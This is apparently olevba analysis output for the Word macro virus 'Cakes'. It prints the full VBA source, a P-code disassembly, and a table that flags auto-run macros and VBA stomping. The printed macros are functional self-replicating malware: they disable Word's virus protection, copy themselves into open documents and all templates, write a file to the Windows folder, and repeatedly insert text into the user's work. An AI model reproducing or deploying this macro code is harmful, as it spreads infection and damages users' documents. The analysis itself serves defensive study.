olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Cakes
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Cakes - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO L_.bas 
in file: ./Virus.MSWord.Cakes - OLE stream: 'Macros/VBA/L_'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'V1.1
'4/10/97
'MJRN-MF-TA
Const Refresh = "00:50:00"
Const Boom = "28/3/"
Sub AutoNew()
        Options.VirusProtection = False
        On Error Resume Next
        Application.OrganizerCopy _
            Source:=ThisDocument.FullName, _
            Destination:=ActiveDocument.FullName, _
            Name:="L_", _
            Object:=wdOrganizerObjectProjectItems
        For Each d In Templates
        If (ThisDocument.FullName <> d.FullName) Then
            Application.OrganizerDelete _
            Source:=d.FullName, _
            Name:="L_", Object:=wdOrganizerObjectProjectItems
            Application.OrganizerCopy _
                Source:=ThisDocument.FullName, _
                Destination:=d.FullName, _
                Name:="L_", _
                Object:=wdOrganizerObjectProjectItems
            d.Save
        End If
        Next d
End Sub
Sub AutoOpen()
        Options.VirusProtection = False
        On Error Resume Next
        If (ThisDocument.FullName <> ActiveDocument.FullName) Then
            Application.OrganizerDelete _
                Source:=ActiveDocument.FullName, _
                Name:="L_", Object:=wdOrganizerObjectProjectItems
            Application.OrganizerCopy _
                Source:=ThisDocument.FullName, _
                Destination:=ActiveDocument.FullName, _
                Name:="L_", _
                Object:=wdOrganizerObjectProjectItems
            ActiveDocument.Save
        End If
        For Each d In Templates
        If (ThisDocument.FullName <> d.FullName) Then
            Application.OrganizerDelete _
                Source:=d.FullName, _
                Name:="L_", Object:=wdOrganizerObjectProjectItems
            Application.OrganizerCopy _
                Source:=ThisDocument.FullName, _
                Destination:=d.FullName, _
                Name:="L_", _
                Object:=wdOrganizerObjectProjectItems
            d.Save
        End If
        Next d
End Sub
Sub AutoExec()
        Options.VirusProtection = False
        On Error Resume Next
        
        Dim f As Integer
        f = FreeFile
        Dim c As Integer
        Open "C:\WINDOWS\MAJORANA.E" For Append As f Len = Len(c)
        
        c = Rnd * 1000
        Write #f, c
        Close f
        
        Dim v As Date
        v = DateValue(Boom & Year(Now))
        If (Date >= v) And (Date <= v + 2) Then
            Application.OnTime when:=Now + TimeValue(Refresh), Name:="L_.effetto"
        Else
            Application.OnTime when:=Now + TimeValue(Refresh), Name:="L_.effetto2"
        End If
End Sub
Sub effetto()
    On Error Resume Next
    v = MsgBox("Hello! This is time of cakes.", , "Hello?")
End Sub
Sub effetto2()
    On Error Resume Next
    s = " Ettore Majorana (1906-1938?) "
    Selection.TypeText Text:=s
    Application.OnTime when:=Now + TimeValue(Refresh), Name:="L_.effetto2"
End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Cakes
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/L_ - 4248 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0004 "V1.1"
' Line #1:
' 	QuoteRem 0x0000 0x0007 "4/10/97"
' Line #2:
' 	QuoteRem 0x0000 0x000A "MJRN-MF-TA"
' Line #3:
' 	Dim (Const) 
' 	LitStr 0x0008 "00:50:00"
' 	VarDefn Refresh
' Line #4:
' 	Dim (Const) 
' 	LitStr 0x0005 "28/3/"
' 	VarDefn Boom
' Line #5:
' 	FuncDefn (Sub AutoNew())
' Line #6:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #7:
' 	OnError (Resume Next) 
' Line #8:
' 	LineCont 0x0010 03 00 0C 00 09 00 0C 00 0F 00 0C 00 13 00 0C 00
' 	Ld ThisDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0002 "L_"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #9:
' 	StartForVariable 
' 	Ld d 
' 	EndForVariable 
' 	Ld Templates 
' 	ForEach 
' Line #10:
' 	Ld ThisDocument 
' 	MemLd FullName 
' 	Ld d 
' 	MemLd FullName 
' 	Ne 
' 	Paren 
' 	IfBlock 
' Line #11:
' 	LineCont 0x0008 03 00 0C 00 09 00 0C 00
' 	Ld d 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	LitStr 0x0002 "L_"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #12:
' 	LineCont 0x0010 03 00 10 00 09 00 10 00 0F 00 10 00 13 00 10 00
' 	Ld ThisDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld d 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0002 "L_"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #13:
' 	Ld d 
' 	ArgsMemCall Save 0x0000 
' Line #14:
' 	EndIfBlock 
' Line #15:
' 	StartForVariable 
' 	Ld d 
' 	EndForVariable 
' 	NextVar 
' Line #16:
' 	EndSub 
' Line #17:
' 	FuncDefn (Sub AutoOpen())
' Line #18:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #19:
' 	OnError (Resume Next) 
' Line #20:
' 	Ld ThisDocument 
' 	MemLd FullName 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Ne 
' 	Paren 
' 	IfBlock 
' Line #21:
' 	LineCont 0x0008 03 00 10 00 09 00 10 00
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	LitStr 0x0002 "L_"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #22:
' 	LineCont 0x0010 03 00 10 00 09 00 10 00 0F 00 10 00 13 00 10 00
' 	Ld ThisDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0002 "L_"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #23:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #24:
' 	EndIfBlock 
' Line #25:
' 	StartForVariable 
' 	Ld d 
' 	EndForVariable 
' 	Ld Templates 
' 	ForEach 
' Line #26:
' 	Ld ThisDocument 
' 	MemLd FullName 
' 	Ld d 
' 	MemLd FullName 
' 	Ne 
' 	Paren 
' 	IfBlock 
' Line #27:
' 	LineCont 0x0008 03 00 10 00 09 00 10 00
' 	Ld d 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	LitStr 0x0002 "L_"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #28:
' 	LineCont 0x0010 03 00 10 00 09 00 10 00 0F 00 10 00 13 00 10 00
' 	Ld ThisDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld d 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0002 "L_"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #29:
' 	Ld d 
' 	ArgsMemCall Save 0x0000 
' Line #30:
' 	EndIfBlock 
' Line #31:
' 	StartForVariable 
' 	Ld d 
' 	EndForVariable 
' 	NextVar 
' Line #32:
' 	EndSub 
' Line #33:
' 	FuncDefn (Sub AutoExec())
' Line #34:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #35:
' 	OnError (Resume Next) 
' Line #36:
' Line #37:
' 	Dim 
' 	VarDefn False (As Integer)
' Line #38:
' 	Ld Friend 
' 	St False 
' Line #39:
' 	Dim 
' 	VarDefn c (As Integer)
' Line #40:
' 	LitStr 0x0015 "C:\WINDOWS\MAJORANA.E"
' 	Ld False 
' 	Ld c 
' 	FnLen 
' 	Open (For Append)
' Line #41:
' Line #42:
' 	Ld Rnd 
' 	LitDI2 0x03E8 
' 	Mul 
' 	St c 
' Line #43:
' 	Ld False 
' 	Sharp 
' 	WriteChan 
' 	Ld c 
' 	PrintItemNL 
' Line #44:
' 	Ld False 
' 	Close 0x0001 
' Line #45:
' Line #46:
' 	Dim 
' 	VarDefn v (As Date)
' Line #47:
' 	Ld Boom 
' 	Ld Now 
' 	ArgsLd Year 0x0001 
' 	Concat 
' 	ArgsLd DateValue 0x0001 
' 	St v 
' Line #48:
' 	Ld Date 
' 	Ld v 
' 	Ge 
' 	Paren 
' 	Ld Date 
' 	Ld v 
' 	LitDI2 0x0002 
' 	Add 
' 	Le 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #49:
' 	Ld Now 
' 	Ld Refresh 
' 	ArgsLd TimeValue 0x0001 
' 	Add 
' 	ParamNamed when 
' 	LitStr 0x000A "L_.effetto"
' 	ParamNamed New 
' 	Ld Application 
' 	ArgsMemCall OnTime 0x0002 
' Line #50:
' 	ElseBlock 
' Line #51:
' 	Ld Now 
' 	Ld Refresh 
' 	ArgsLd TimeValue 0x0001 
' 	Add 
' 	ParamNamed when 
' 	LitStr 0x000B "L_.effetto2"
' 	ParamNamed New 
' 	Ld Application 
' 	ArgsMemCall OnTime 0x0002 
' Line #52:
' 	EndIfBlock 
' Line #53:
' 	EndSub 
' Line #54:
' 	FuncDefn (Sub effetto())
' Line #55:
' 	OnError (Resume Next) 
' Line #56:
' 	LitStr 0x001D "Hello! This is time of cakes."
' 	ParamOmitted 
' 	LitStr 0x0006 "Hello?"
' 	ArgsLd MsgBox 0x0003 
' 	St v 
' Line #57:
' 	EndSub 
' Line #58:
' 	FuncDefn (Sub effetto2())
' Line #59:
' 	OnError (Resume Next) 
' Line #60:
' 	LitStr 0x001E " Ettore Majorana (1906-1938?) "
' 	St s 
' Line #61:
' 	Ld s 
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #62:
' 	Ld Now 
' 	Ld Refresh 
' 	ArgsLd TimeValue 0x0001 
' 	Add 
' 	ParamNamed when 
' 	LitStr 0x000B "L_.effetto2"
' 	ParamNamed New 
' 	Ld Application 
' 	ArgsMemCall OnTime 0x0002 
' Line #63:
' 	EndSub 
' Line #64:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|WINDOWS             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

